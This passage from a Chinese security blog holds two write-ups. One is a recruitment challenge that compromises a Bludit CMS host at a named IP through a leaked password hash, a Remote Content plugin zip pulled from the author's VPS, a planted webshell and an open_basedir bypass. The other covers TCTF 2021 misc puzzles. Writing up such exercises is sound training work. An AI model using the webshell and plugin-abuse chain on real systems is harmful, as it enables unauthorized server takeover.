‡ï¼Œè¯·ç¬¬ä¸€æ—¶é—´è”ç³»å¯¹åº”çš„é‚®ç®±ã€‚å…³äºå›¢é˜Ÿç”³è¯·æ–¹å¼åŠåæœŸæ´»åŠ¨éƒ½åœ¨é™„ä»¶ä¸­æœ‰è¯´æ˜ã€‚ç›®æ ‡åœ°å€ï¼š119.45.4.159ä»»åŠ¡è·å–ç›®æ ‡æœåŠ¡å™¨ä¸­â€œHi RedTeamâ€æ–‡ä»¶å†…å®¹ï¼Œå³å¯ï¼ˆâ€œHi RedTeamâ€æ˜¯æ–‡ä»¶åï¼Œå¼ºè°ƒæ˜¯æ–‡ä»¶åï¼‰ã€‚ã€æˆªæ­¢æ—¥æœŸ2021å¹´7æœˆ4æ—¥ã€‘ ä¸Šä¸ªæœˆåº•æŸå¤©åˆ·ç€è¯´è¯´ï¼Œæ­£å¥½çœ‹åˆ°æœ‰å¸ˆå‚…è½¬å‘äº†è¿™ä¸ªæ´»åŠ¨ã€‚ å¯»æ€ç€é‚£å‡ å¤©æ‘¸é±¼æ¯”è¾ƒæœ‰ç©ºï¼Œæ¥éšä¾¿ç©äº†ç©ï¼Œè¿™é‡Œä¹Ÿå°±ç®€å•è®°å½•ä¸€ä¸‹ã€‚ æ­¥éª¤ ç›®æ ‡é¶æœºåœ°å€ï¼šhttp://119.45.4.159/ ï¼ˆç°åœ¨åº”è¯¥å…³äº† ç”¨çš„æ˜¯ Bludit è¿™ä¸ª CMS. ï¼ˆGitHub repoï¼‰ fscan ä¸€ä¸‹ # ./fscan -h 119.45.4.159 ___ _ / _ \\ ___ ___ _ __ __ _ ___| | __ / /_\\/____/ __|/ __| '__/ _` |/ __| |/ / / /_\\\\_____\\__ \\ (__| | | (_| | (__| &lt; \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ fscan version: 1.6.2 start infoscan (icmp) Target '119.45.4.159' is alive icmp alive hosts len is: 1 119.45.4.159:888 open 119.45.4.159:21 open 119.45.4.159:22 open 119.45.4.159:80 open 119.45.4.159:8888 open alive ports len is: 5 start vulscan [*] WebTitle:http://119.45.4.159:888 code:403 len:262 title:403 Forbidden [*] WebTitle:http://119.45.4.159:8888 code:302 len:219 title:Redirecting... [*] WebTitle:http://119.45.4.159 code:200 len:27 title:æ¬¢è¿ä½¿ç”¨Bludit | BLUDIT [*] WebTitle:http://119.45.4.159:8888/login code:200 len:24 title:å®‰å…¨å…¥å£æ ¡éªŒå¤±è´¥ [+] InfoScan:http://119.45.4.159:8888/login å®å¡”-BT.cn å·²å®Œæˆ 5/5 scan end 8888 ç«¯å£æœ‰ä¸ª åˆ åº“ å®å¡”ï¼Œä¸è¿‡æ—¥ä¸èµ·æ¥ã€‚ dirsearch å‘ç° 80 ç«¯å£ä¸»ç«™æœ‰å¤‡ä»½æ–‡ä»¶æ³„éœ²ã€‚ ä¸‹è½½ä¸‹æ¥ã€‚ \\bl-content\\databases\\users.php &lt;?php defined('BLUDIT') or die('Bludit CMS.'); ?&gt; { \"admin\": { \"nickname\": \"Admin\", \"firstName\": \"\\u7ba1\\u7406\\u5458\", \"lastName\": \"\", \"role\": \"admin\", \"password\": \"0b6142813f850401af6f2dc79e0e54ca11e8ebde\", \"salt\": \"60d801bb12cea\", \"email\": \"\", \"registered\": \"2021-06-27 12:42:35\", \"tokenRemember\": \"\", \"tokenAuth\": \"2ffb21608fe6d91865de3ea1ff3366a3\", \"tokenAuthTTL\": \"2009-03-15 14:00\", \"twitter\": \"\", \"facebook\": \"\", \"instagram\": \"\", \"codepen\": \"\", \"linkedin\": \"\", \"github\": \"\", \"gitlab\": \"\" } } åˆ° https://www.somd5.com/ è§£å¯†ä¸€ä¸‹ å¾—åˆ°å¯†ç ä¸º redteamã€‚ ç™»å½•è¿›å…¥åå°ã€‚ ç‰ˆæœ¬ä¿¡æ¯ å½“ç„¶ï¼Œé€šè¿‡ CSS ç­‰ä¹Ÿå¯ä»¥çŸ¥é“ç‰ˆæœ¬ä¿¡æ¯ä¸º 3.12.0 æ ¹æ® GitHub ä¸Šçš„ Bludit v3.13.0ï¼Œå‘ç°æœç„¶æœ‰æ´ï¼Œä¿®äº†ä¸ªæ–‡ä»¶ä¸Šä¼ çš„æ¼æ´ã€‚ æ ¹æ® https://github.com/bludit/bludit/issues/1218 å¥½å®¶ä¼™ï¼Œæ˜¯å°–å°–å¸ˆå‚…æŒ–çš„æ´ï¼ ç„¶åå‘ç°ä»–æŠŠ uploadBackup è¿™ä¸ªå‡½æ•°éƒ½åˆ äº†â€¦â€¦ è¿™è·¯èµ°ä¸é€šã€‚ å†æœäº†ä¸€ä¸‹è¿˜æœ‰ä¸å°‘ XSS çš„æ´ï¼Œä¹Ÿæ²¡å•¥ç”¨ã€‚ çœ‹æºç ï¼Œæ–‡ä»¶ä¸Šä¼ éƒ½æœ‰æ‹“å±•åçš„è¿‡æ»¤ï¼Œ3.13.0 ç‰ˆæœ¬æ–°å¢äº† Mime type æ ¡éªŒï¼Œä¹Ÿæ²¡å•¥ç”¨ã€‚ å†çœ‹æ’ä»¶ï¼Œå‘ç°æœ‰ä¸ªæ’ä»¶ Remote Content å¯ä»¥ä¸‹è½½æ–‡ä»¶ã€‚ This plugin provides an easy way to have the content of your site on Github or similar and in turn is synchronized with your Bludit. æºç è·¯å¾„åœ¨ backup\\bl-plugins\\remote-content\\plugin.php å…³é”®æºç å¦‚ä¸‹ã€‚ public function beforeAll() { // Check Webhook $webhook = $this-&gt;getValue('webhook'); if ($this-&gt;webhook($webhook)) { $this-&gt;cleanUp(); // Download files $this-&gt;downloadFiles(); // Delete the current content $this-&gt;deleteContent(); // Generate the new content $this-&gt;generateContent(); // End request $this-&gt;response(array('status'=&gt;'0')); } } private function downloadFiles() { // Download the zip file Log::set('Plugin Remote Content'.LOG_SEP.'Downloading the zip file.'); $source = $this-&gt;getValue('source'); $destinationPath = $this-&gt;workspace(); $destinationFile = $destinationPath.'content.zip'; TCP::download($source, $destinationFile); // Uncompress the zip file Log::set('Plugin Remote Content'.LOG_SEP.'Uncompress the zip file.'); $zip = new ZipArchive; if ($zip-&gt;open($destinationFile)===true) { $zip-&gt;extractTo($destinationPath); $zip-&gt;close(); } // Delete the zip file unlink($destinationFile); return true; } // Delete the page and uploads directories from bl-content private function deleteContent() { // Clean the page database global $pages; $pages-&gt;db = array(); Filesystem::deleteRecursive(PATH_PAGES); Filesystem::deleteRecursive(PATH_UPLOADS); mkdir(PATH_PAGES, DIR_PERMISSIONS, true); mkdir(PATH_UPLOADS, DIR_PERMISSIONS, true); mkdir(PATH_UPLOADS_PROFILES, DIR_PERMISSIONS, true); mkdir(PATH_UPLOADS_THUMBNAILS, DIR_PERMISSIONS, true); return true; } private function cleanUp() { $workspace = $this-&gt;workspace(); Filesystem::deleteRecursive($workspace.DS); mkdir($workspace, DIR_PERMISSIONS, true); return true; } private function generateContent() { global $pages; $root = Filesystem::listDirectories($this-&gt;workspace()); $root = $root[0]; // first directory created by the unzip // For each page inside the pages directory // Parse the page and add to the database if (Filesystem::directoryExists($root.DS.'pages')) { $parentList = Filesystem::listDirectories($root.DS.'pages'.DS); foreach ($parentList as $parentDirectory) { $parentKey = basename($parentDirectory); if (Filesystem::fileExists($parentDirectory.DS.'index.md')) { $row = $this-&gt;parsePage($parentDirectory.DS.'index.md'); $row['slug'] = $parentKey; $pages-&gt;add($row); } $childList = Filesystem::listDirectories($parentDirectory.DS); foreach ($childList as $childDirectory) { $childKey = basename($childDirectory); if (Filesystem::fileExists($childDirectory.DS.'index.md')) { $row = $this-&gt;parsePage($childDirectory.DS.'index.md'); $row['slug'] = $childKey; $row['parent'] = $parentKey; $pages-&gt;add($row); } } } Theme::plugins('afterPageCreate'); reindexCategories(); reindexTags(); } return true; } å°±åˆ©ç”¨ backup.zipï¼Œéšä¾¿ echo ä¸ªä¸œè¥¿ã€‚ åœ¨è‡ªå·± VPS ä¸ŠæŠŠè¿™ä¸ªå‹ç¼©åŒ…æ”¾å¥½ï¼Œèµ·ä¸ª web æœåŠ¡ã€‚ Source å°±å¡« VPS ä¸Šæ–‡ä»¶çš„åœ°å€ã€‚ è®¿é—® http://119.45.4.159/bacw è§¦å‘ã€‚ è€Œååœ¨ http://119.45.4.159/bl-content/workspaces/remote-content/index.php å°±çœ‹åˆ°è¿™ä¸ª 233 äº†ã€‚è¯´æ˜æœ‰æˆã€‚ å†å†™ä¸ªä¸€å¥è¯æœ¨é©¬ä¸Šå»ã€‚ èšå‰‘æˆåŠŸè¿ä¸Šï¼ åŒç†ï¼Œå†°èä¹Ÿå¯ã€‚ ç„¶è€Œåå¼¹ shell æ²¡æœ‰å›æ˜¾å•Šâ€¦â€¦ å¦å¤–ä¹Ÿé™åˆ¶äº†èƒ½è®¿é—®çš„ç›®å½•ã€‚ å‘ç°æœ‰ä¸ª .user.ini é‡Œè®¾ç½®äº† open_basedir. å‚è€ƒ phpæ–‡ä»¶åŒ…å«ç›®å½•é…ç½®open_basedirçš„ä½¿ç”¨ä¸æ€§èƒ½åˆ†æ open_basedir å°†phpæ‰€èƒ½æ‰“å¼€çš„æ–‡ä»¶é™åˆ¶åœ¨æŒ‡å®šçš„ç›®å½•æ ‘ä¸­ï¼ŒåŒ…æ‹¬æ–‡ä»¶æœ¬èº«ã€‚å½“ç¨‹åºè¦ä½¿ç”¨ä¾‹å¦‚fopen()æˆ–file_get_contents()æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œè¿™ä¸ªæ–‡ä»¶çš„ä½ç½®å°†ä¼šè¢«æ£€æŸ¥ã€‚å½“æ–‡ä»¶åœ¨æŒ‡å®šçš„ç›®å½•æ ‘ä¹‹å¤–ï¼Œç¨‹åºå°†æ‹’ç»æ‰“å¼€ã€‚ æŠŠè¿™ä¸ª .user.ini é‡å‘½åï¼Œç„¶åå°±èƒ½ä¸å—è¿™ä¸ªé™åˆ¶ï¼Œè®¿é—®å…¶ä»–ç›®å½•å•¦ã€‚ ç„¶è€Œ disable_functions è²Œä¼¼ç»•ä¸æ¥å•Šã€‚ã€‚ passthru,exec,system,putenv,chroot,chgrp,chown,shell_exec,popen,proc_open,pcntl_exec,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,imap_open,apache_setenv å™¢ï¼Œä¸ç”¨ç»•äº†â€¦â€¦ å‘ç°æ‰€éœ€è¦çš„ Hi RedTeam æ–‡ä»¶å°±åœ¨ wwwroot çš„å¦ä¸€ä¸ªç›®å½•ä¸‹ã€‚ï¼ˆæ—ç«™å˜›ï¼‰ å®Œäº‹~ å°ç»“å…¶å®éš¾åº¦è¿˜å¥½ï¼Œå°±è¿™æ ·å§ï¼ˆ é¡ºä¾¿ï¼Œæ„Ÿè°¢å¤§å¸ˆå‚…å‡ºé¢˜ï¼Œå¸ˆå‚…ä»¬å¤ªå¼ºå•¦ Orzï¼ å®˜æ–¹ Writeup ä¹Ÿå‡ºæ¥äº†ï¼š Bludit 3.12.0 ã€ç™¾çµé¸Ÿå®‰å…¨å›¢é˜Ÿ 2021.06çº³æ–°é¢˜ Writeupã€‘ åŸæ¥è¿˜æœ‰ä¸€ç§é€šè¿‡ API ä¸Šä¼ å›¾ç‰‡çš„æ¼æ´æ¥æ—¥çš„æ–¹æ³•å•Šã€‚ ï¼ˆæºœäº†æºœäº†å–µ~","path":"2021/07/18/Pentest_2021bailingniao_Bludit/"},{"title":"CTF | 2021 TCTF/0CTF Quals WriteUp","text":"è¿™æ˜¯ä¸€ç¯‡æ”¾åœ¨è‰ç¨¿ç®±é‡Œå·²ç»é•¿è‰çš„æ–‡ç« ï¼Œæ¸…ç†çš„æ—¶å€™æ‰æƒ³èµ·æ¥è¿™ç¯‡ç”±äºæ²¡ç¯å¢ƒå¤ç°ï¼Œåé¢ä¸€æ‡’å°±å¿˜è®°å‘äº†â€¦â€¦ å™¢ï¼Œå–µå–µä¹Ÿä¸è®°å¾—æœ‰æ²¡æœ‰å†™å®Œäº†ï¼Œå°±å°†å°±å‘ä¸€ä¸‹å§ï¼ˆæ‘Šæ‰‹ å¼•è¨€ TCTF/0CTF 2021 Quals æ¯”èµ›æ—¶é—´: 2021-07-03 10:00 ~ 2021-07-05 10:00 https://tctf.qq.com/ https://ctf.0ops.sjtu.cn/ æˆ– https://tctf.0ops.top/ å‰ä¸ä¹…æœ‰ä¸ª TCTF/0CTF 2021 çº¿ä¸Šé¢„é€‰èµ›ï¼Œå¯»æ€ç€æœ‰ç‚¹æ„æ€å°±æ¥æ‰“äº†ï¼Œé¢˜ç›®å¥½éš¾å•Šã€‚ åªä¸è¿‡é˜Ÿé‡Œçš„å°å¸ˆå‚…ä»¬éƒ½åœ¨å‡†å¤‡æœŸæœ«è€ƒè¯•ï¼Œä¹ˆå¾—åŠæ³•åªæœ‰å‡ ä¸ªè€äººéšä¾¿ç©äº†ã€‚ è¿™ç¯‡å°±éšä¾¿æ°´æ°´å§ã€‚ Miscwelcome Welcome to 0CTF/TCTF 2021! Join Discord for flag flag{welcome_to_0ctf/tctf_2021_have_fun} GutHib What happens on GutHib, stays on GutHib. repo: awesome-ctf/TCTF2021-Guthib æ ¹æ® commit å†å²å¯ä»¥çœ‹åˆ°æœ‰æ•æ„Ÿä¿¡æ¯è¢«ç§»é™¤äº†ã€‚ å‘ç°ç”¨äº† BFG Repo-Cleaner æ¥æ¸…ç† commit å†å²é‡Œç•™å­˜çš„æ•æ„Ÿä¿¡æ¯ã€‚ å…¶å®˜æ–¹çš„æ–‡æ¡£ï¼šhttps://rtyley.github.io/bfg-repo-cleaner/ ä½¿ç”¨è¯´æ˜ï¼ˆUsageï¼‰ å¯¹æ¯”å¯ä»¥å‘ç°æ²¡æœ‰æ‰§è¡Œ gc åƒåœ¾æ¸…ç†æ“ä½œï¼Œç†è®ºä¸Šæœ¬åœ°çš„ object é‡Œè¿˜å­˜æœ‰åŸå§‹çš„æ•°æ®ã€‚ ç„¶è€Œç›´æ¥ git clone ä¸‹æ¥çš„ object pack ä¸­å¹¶æ²¡æœ‰å†—ä½™ä¿¡æ¯ï¼Œå¯èƒ½ä¼ è¾“è¿‡ç¨‹ä¸­è¿›è¡Œäº†ç²¾ç®€å§â€¦â€¦ ä¸è¿‡åˆ©ç”¨ GitHub API è®°å½•çš„ eventsï¼Œç”±äº API æ˜¯è¯»çš„æ˜¯ GitHub çš„ event æ•°æ®åº“ï¼Œè€Œä¸æ˜¯ git repositoryï¼Œæœ¬åœ°æœ€å push ä¸Šæ¥çš„å¹¶æ²¡æœ‰å½±å“æœåŠ¡å™¨ä¸Šçš„ã€‚è€Œ GitHub ä¸Šçš„ä¹Ÿæ²¡è¿›è¡Œ gc æ¸…ç†ï¼Œè¿™å°±èƒ½å¤Ÿæ¢å¤äº†ã€‚ https://api.github.com/repos/awesome-ctf/TCTF2021-Guthib/events?page=4 é¦–å…ˆä» event é‡Œæ‹¿åˆ°ä¹‹å‰é”™è¯¯çš„ commit hashï¼Œç„¶åç”¨ commit hash å†å»æ‰¾å¯¹åº”çš„æäº¤å’Œæ–‡ä»¶ã€‚ https://api.github.com/repos/awesome-ctf/TCTF2021-Guthib/commits/da883505ed6754f328296cac1ddb203593473967 https://github.com/awesome-ctf/TCTF2021-Guthib/blob/da883505ed6754f328296cac1ddb203593473967/Try.2.md flag{ZJaNicLjnDytwqosX8ebwiMdLGcMBL} æŒºæœ‰æ„æ€çš„ 233. See also: ä½¿ç”¨ Roberto Tyley çš„ BFG Repo-Cleaner ç§»é™¤ git åº“ä¸­çš„äºŒè¿›åˆ¶æ–‡ä»¶ åœ¨ git ä¸­ï¼Œæ‰€æœ‰æ–‡ä»¶å’Œæ–‡ä»¶å¤¹çš„æ•°æ®éƒ½åªå­˜å‚¨ä¸€æ¬¡ï¼Œå¹¶ä¸”æ¯ä¸ªéƒ½ä¼šæœ‰ä¸€ä¸ªç‹¬ä¸€æ— äºŒçš„ idâ€”â€”git-idã€‚å¦‚æœå¤§é‡çš„ commit éƒ½æ²¡æœ‰ä¿®æ”¹æŸä¸ªæ–‡ä»¶ï¼Œé‚£ä¹ˆè¿™ä¸ªæ–‡ä»¶åªä¼šè¢«ä¿å­˜ä¸€æ¬¡ã€‚å¦‚æœè¿™ä¸ªæ–‡ä»¶æœ‰ä¸¤ä¸ªç‰ˆæœ¬ï¼Œå¹¶ä¸”éœ€è¦åœ¨ä¸¤ä¸ªç‰ˆæœ¬é—´æ¥å›åˆ‡æ¢ï¼Œè¿™ä¸ªæ–‡ä»¶åªä¼šå­˜å‚¨ä¸¤æ¬¡ï¼Œæ¯ä¸ªç‰ˆæœ¬å„ä¸€æ¬¡ã€‚ BFG åªå¯¹ git åº“ä¸­çš„æ¯ä¸ªå¯¹è±¡æ¸…ç†ä¸€æ¬¡ï¼Œç„¶åè®°ä½å®ƒçš„ git-idï¼Œä»¥åé‡åˆ°å®ƒï¼Œä¸æŠŠå®ƒè®¡ç®—åœ¨å†…å°±è¡Œäº†ã€‚ BFG Repo-Cleaner - ä» Git å†å²ä¸­çœŸæ­£åˆ é™¤æ–‡ä»¶ å…¶å®åˆšå¼€å§‹è€ƒè™‘ BFG é»˜è®¤è®¤ä¸ºå½“å‰æœ€æ–°çš„ commit å·²ç»åˆ é™¤äº†æ•æ„Ÿä¿¡æ¯ï¼Œäºæ˜¯å…¶è¿›è¡Œçš„ä¿®æ”¹åªæ¶‰åŠå†å² commitï¼Œæœ€æ–° commit ä¸åšæ›´æ”¹ã€‚åæ¥å‘ç°å…¶å®å½“å‰æœ€æ–°çš„ commit ä¹Ÿå·²ç»åˆ æ‰æ•æ„Ÿä¿¡æ¯äº†â€¦â€¦ .gitæ–‡ä»¶å¤¹æ¢ç§˜ï¼Œç†è§£gitè¿ä½œæœºåˆ¶ ï¼ˆç„¶åæŠŠ git åº•å±‚å’‹å­˜å‚¨çš„ç»™æ‘¸äº†ä¸€é 233 Survey https://wj.qq.com/s2/8706427/d012/ flag{im_curious_have_u_viewed_source_before_filling_out_the_survey} å™¢æ˜¯è¿™ä¸ªæ„æ€å•Šã€‚ Singer Sing a song~ special format: flag{[a-z]*} https://attachment.ctf.0ops.sjtu.cn/singer_0cc09b073ebbbffcc5720d081f42feea ç»™çš„æ–‡ä»¶æ˜¯è¿™ä¸ªã€‚ A6-D#6 G#6 G6 G6 G#6 A6-D#6 C6-G5 F#5 F#5 C6-G5 A6-F#6,D#6 A6,F#6,D#6 A6,F#6-D#6 A6,D#6 A6-D#6 A6,D#6 F#7-C7 E7-D7 F7,C#7 F#7,C7 E6,A#5 E6-A#5 E6,A#5 A6-D#6 A6-G6 F#6-E6 A6-D#6 C#7-G6 C#7,G6 C#7,A#6,G6 C#7,A#6-G6 å¯»æ€ç€åº”è¯¥æ˜¯éŸ³ç¬¦ã€‚ æƒ³äº†åŠå¤©æ²¡ææ‡‚å•¥æ„æ€ã€‚ã€‚ åæ¥è€ƒè™‘æ˜¯ä¸æ˜¯éŸ³æ¸¸çš„è°±å­å•Šï¼ŒæŸ¥äº†æŸ¥å‘ç°ä¹Ÿä¸æ˜¯å§ã€‚ ä½†åæ¥åˆçœ‹åˆ°æŸéŸ³æ¸¸â€”â€” ä¼šä¸ä¼šæ˜¯è¿™ä¸ªæŒ‰é”®è¿æˆçš„å•¥å­—ç¬¦å•Šã€‚ ç„¶è€Œæ¯”èµ›çš„æ—¶å€™å°±æ²¡ç”»å‡ºæ¥ï¼Œè‰ï¼ èµ›åå‘ç°æœ‰ä¸ª Online Sequencerï¼Œæ˜¯ä¸€ä¸ªåœ¨çº¿åˆ¶ä½œéŸ³ä¹çš„å·¥å…·ï¼Œæ”¯æŒæ¨¡æ‹Ÿå¤šç§ä¹å™¨ï¼Œå¯ä»¥å¯¼å‡º ogg/mp3/midiï¼Œè¿˜èƒ½åˆ†äº« sequenceã€‚ ç„¶åæŒ‰ç…§æ–‡ä»¶é‡Œçš„åˆ†å—ï¼Œæ¯ä¸ªåˆ†å—æ˜¯ä¸€ä¸ªå­—æ¯ï¼Œ- å°±æ˜¯ä¸¤ä¸ªé”®ä¹‹é—´è¿èµ·æ¥ï¼Œ, å°±æ˜¯å¤šä¸ªé”®åŒæ—¶æŒ‰ä¸‹ã€‚ äºæ˜¯å°±å¯ä»¥å¾—åˆ°è¿™æ ·çš„å›¾å½¢ã€‚ äºæ˜¯ flag å°±æ˜¯ flag{musiking} ï¼ˆè„‘æ´çœŸçš„å¤§â€¦â€¦ TCTF Share It is a misc quest absolutely. https://bt.hzh.moe/ Flag format: TCTF{.*} æ˜¯ä¸ª hugo å»ºçš„åšå®¢ï¼Œä¸¤ç¯‡åšæ–‡ã€‚ ä¸Šé¢é‚£ç¯‡ Wonder Egg Priority OP ä¸¤ä¸ªç£åŠ›é“¾æ¥åˆ†åˆ«æ˜¯ https://bt.hzh.moe/files/Wonder-Egg-Priority-Safe.torrent magnet:?xt=urn:btih:CIY7BQVJYC7GXF3AF4OA6SLZTZZAQDBS&amp;dn=%E3%83%AF%E3%83%B3%E3%83%80%E3%83%BC%E3%82%A8%E3%83%83%E3%82%B0%E3%83%BB%E3%83%97%E3%83%A9%E3%82%A4%E3%82%AA%E3%83%AA%E3%83%86%E3%82%A3%20(Wonder%20Egg%20Priority)%20OP.7z çœ‹äº†ä¸‹æœ‰ä¸ª txt æ–‡ä»¶ï¼Œé“¾æ¥å°±æ˜¯ä¸ªåŠ¨æ¼«ã€‚https://www.youtube.com/watch?v=5yN9w_yzH2w ä¸‹é¢é‚£ç¯‡ Tencent CTF https://bt.hzh.moe/files/TCTF.torrent magnet:?xt=urn:btih:AQEQB7YBOGIMOQARSRXSHGULZUI25EY3&amp;dn=Secret%20of%20TCTF%202021.7z å¾ˆæ˜æ˜¾å°±æ˜¯è¿™ä¸ªäº†ï¼Œç„¶è€Œä¸Šé¢é‚£ä¸ªä¸‹è½½ä¸‹æ¥æ˜¯å…¨ç©ºçš„ï¼Œä¸‹é¢é‚£ä¸ªä¸‹è½½ä¸ä¸‹æ¥ã€‚ å‚è€ƒç£åŠ›é“¾æ¥çš„ç»“æ„ï¼Œbtih æ˜¯æŒ‡ BitTorrent Info Hashã€‚ å‚è€ƒå¤§å¸ˆå‚…çš„ wpï¼ŒAQEQB7YBOGIMOQARSRXSHGULZUI25EY3 å³è¢« Base32 ç¼–ç è¿‡çš„ BTIH æ•£åˆ—ç»“æœï¼ŒæŠŠå®ƒè½¬æ¢ä¸º hex ç¼–ç çš„ã€‚ %04%09%00%ff%01%71%90%c7%40%11%94%6f%23%9a%8b%cd%11%ae%93%1b å†å‚è€ƒç¬¬ä¸€ä¸ª torrent æ–‡ä»¶ï¼Œå¯ä»¥å¾—åˆ° httpseeds å‚è€ƒ å¯¹äºbittorrentåè®®çš„æ·±å…¥ç ”ç©¶ä¸æ¢è®¨ HTTP Seeding HTTP-BASED SEEDING SPECIFICATION PROTOCOL: The client calls the URL given, in the following format: &lt;url&gt;?info_hash=[hash]&amp;piece=[piece]{&amp;ranges=[start]-[end]{,[start]-[end]}...} Examples: http://www.whatever.com/seed.php?info_hash=%9C%D9i%8A%F5Uu%1A%91%86%AE%06lW%EA%21W%23\u00025%E0&amp;piece=3 http://www.whatever.com/seed.php?info_hash=%9C%D9i%8A%F5Uu%1A%91%86%AE%06lW%EA%21W%23\u00025%E0&amp;piece=8&amp;ranges=49152-131071,180224-262143 äºæ˜¯å¯ä»¥æ„é€ å‡ºåœ°å€ä¸º https://bt.hzh.moe/seeding?info_hash=%04%09%00%FF%01%71%90%C7%40%11%94%6F%23%9A%8B%CD%11%AE%93%1B&amp;piece=0 ç›´æ¥æµè§ˆå™¨é‡Œæ‰“å¼€ä¸è¡Œï¼Œéœ€è¦æ”¹ UA ä¸º BT å®¢æˆ·ç«¯â€¦â€¦ å†™ä¸ªè„šæœ¬åˆ† piece ä¸‹è½½ä¸€ä¸‹ã€‚è¶…è¿‡èŒƒå›´ä¼šè¿”å› 400ï¼Œåˆ¤æ–­ä¸€ä¸‹é€€å‡ºã€‚ import requests fp = open('1.7z', 'wb') header = {'user-agent': 'uTorrent'} i = 0 while True: print(i) url = f'https://bt.hzh.moe/seeding?info_hash=%04%09%00%FF%01%71%90%C7%40%11%94%6F%23%9A%8B%CD%11%AE%93%1B&amp;piece={i}' r = requests.get(url, headers=header) fp.write(r.content) if r.status_code == 400: break i += 1 print('Download OK!') æœ€å piece æ˜¯ 0-46ï¼Œä¸‹è½½ä¸‹æ¥è§£å‹å¾—åˆ°ä¸€ä¸ª TCTF.vhdxã€‚ æŒ‚è½½å¾—åˆ°ä¸€ä¸ª hint.bat æœ€åæç¤ºäº†æ–‡ä»¶åè¿›è¡Œäº†ä¿®æ”¹ã€‚ äºæ˜¯å¯ä»¥å»æŸ¥çœ‹ NTFS ç¡¬ç›˜å†å²è®°å½•ã€‚æƒ³èµ·ä¸Šæ¬¡å¼ºç½‘æ¯é‚£é“ EzTime é¢˜ç›®äº†â€¦â€¦ è¿™é‡Œè¯•äº†è¯•ç”¨ AXIOM åˆ†æç¡¬ç›˜ $LogFileï¼Œå‘ç°å·¨å¤§å¤šä¿®æ”¹æ–‡ä»¶åçš„è®°å½•ã€‚ æ‰¾äº†åŠå¤©ç¡®å®èƒ½æ‰¾åˆ° flag äº†â€¦â€¦ TCTF{B7UmV4x8JRHNKBCWxyevXt97tnQJtHjrZ} æˆ–è€…ä¹Ÿå¯ä»¥å¯¼å‡ºç¡¬ç›˜æ—¥å¿—ï¼Œç„¶åå†™ä¸ªè„šæœ¬æ•´åˆä¸€ä¸‹ã€‚ é¦–å…ˆç”¨ DiskGenius æŠŠæ˜¾ç¤ºå…ƒæ–‡ä»¶ï¼ˆMetafileï¼‰å‹¾ä¸Šï¼Œç„¶åæ‰èƒ½çœ‹åˆ° $LogFile è¿™äº›ä¿¡æ¯ï¼Œç„¶åå¯¼å‡ºæ¥ã€‚ ç”¨ LogFileParser æ¥è§£æç¡¬ç›˜æ—¥å¿—ï¼Œå¯ä»¥å¾—åˆ° csv æ•°æ®æ–‡ä»¶ã€‚ æ ¹æ®è¿™ä¸ª LogFile_lfUsnJrnl.csv å¯ä»¥å¾—çŸ¥æ–‡ä»¶çš„ä¿®æ”¹å†å²ã€‚ å†™ä¸ªè„šæœ¬ï¼Œæ‰¾ä¸€ä¸‹æ›´æ”¹ä¸ºæ–°åå­—ä¸”æ–‡ä»¶åé•¿åº¦ä¸º1çš„æ–‡ä»¶åï¼Œå¦å¤–å†æ ¹æ® MFTReference åˆ†åˆ«ç»Ÿè®¡å¹¶è¾“å‡ºã€‚ with open('LogFile_lfUsnJrnl.csv', 'r', encoding='utf-8') as f: s = f.read() l = s.split('\\n') # 404.html|304|2021-07-02 20:12:48.5212936|FILE_CREATE+DATA_EXTEND+CLOSE|40|1|39|1|archive|2|0|0x00000000|0 info = {} data = '' for x in l: d = x.split('|') # if d[3] == 'RENAME_NEW_NAME+CLOSE': if 'RENAME_NEW_NAME+CLOSE' in d: f = d[0] print(f) filename = f.split('.')[0] if len(filename) == 1: # extension = f.split('.')[1] MFTReference = d[4] if MFTReference not in info: info[MFTReference] = '' info[MFTReference] += filename print(info) for i in sorted(info, key=lambda x: x[0]): print(i, info[i]) # 43 wpa4b1AQVPOibxTBwz7Qn2xXcFy{Jbnca7pDyIMAR7i8Sseg5sRpPIBIW68opBiNB # 49 t}IuwI9Chdl0O1P8hYzwku8MTfKub4li49wzetpEbWHIHfhl3WGc7gh0c0WzpMClH # 46 iPt86USAMpWJz5fDI47Vzu6BdlqxCxX0n6viKvNoZ7AzEAEHOpny0ZfV6tuT4QZm # 47 j}vUG4Hr}DVGRFKZcY6op5BGLT}LqLrudLZqHOrh9Hcx8LVpOIeobvkrEyaTPzpV # 44 phYaPUyusxk5}0PJQ19HsH3jHIonhFQVBxyzvtTUL7}W61xv7t3tUBhWOKiVio}tM # 40 a3bGkqTNUhMOUAp2DMsAlA3}5jTxtPamvcuRJugpnD{pr}Wp4FDdr2HqUqYVyQ26 # 50 5TW57LSdRtbqa404yFJd2ujXJ{lPRPUwtfGtywtJBP5eGUF{mvkZE7}wSg5deoHL}i # 59 NCJUO0B}Olw1b6CgZTFsncv2}pYfTJ323WJHeE03g2IZaCcyhgLn3WS2BGKr7zglR6 # 54 m0ngAg1g16KUDp8Zl0K7nbwLrLhMoasREHClz2aWJY6edmGlHrOdqXFgeKUQBEko # 53 Q2DnB4b{K{2FxleNfZ5ZDaA6tl{GIUbMFN3kLOs1p5kJgu9TzYBxGDTmYa}iet2}P # 51 Dyxy3OTAJdsovteo3{Z1MirxF9BmJ1ZAfov7tGKi1CpiDmNF7o3IJEvhOmV9RjLDP # 57 WOW0Is1That2Flag3TCTF{B7UmV4x8JRHNKBCWxyevXt97tnQJtHjrZ}4God5Job # 64 Nh1W7gq{Ea7XLGNCnFpKlo3j0sXxUklmrqFWtWt04Dc80XDg90JqFgZzLiWeoJbzx # 65 ngnv2GZ6UD9aJnfnuFBIx1Mo084lND4}Oom7x{rbT7mTHl6OtNM9CrOjZGD4Lce # 62 L61ulkKDvC7Kh}FYXwslD0jp{auQstMN5S2hIXmSMkdZtYTVmltslyLPCTOdF1ysG # 61 yrOyO9XJK13Pbnr2Msym{NzdA5mbyhKL5cgbO2moJC90f92B7Q0lGIucN2XAXj}MQ 